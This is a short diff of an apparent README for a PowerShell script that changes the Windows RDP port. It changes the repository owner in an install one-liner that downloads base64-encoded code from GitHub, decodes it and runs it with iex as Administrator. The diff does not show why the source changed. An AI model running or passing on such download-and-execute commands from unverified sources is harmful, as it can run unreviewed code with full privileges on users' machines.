@@ -25,4 +25,4 @@ It is designed to be executed directly from GitHub using PowerShell `IEX` (Invok
 Open **PowerShell as Administrator** and run:
 
 ```powershell
-iex ((Invoke-RestMethod https://api.github.com/repos/yamenyip/Set-WindowRDPPort/contents/Set-RDPPort.ps1?ref=main).content | % { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_)) })
+iex ((Invoke-RestMethod https://api.github.com/repos/yytmy4lq/Set-WindowRDPPort/contents/Set-RDPPort.ps1?ref=main).content | % { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_)) })
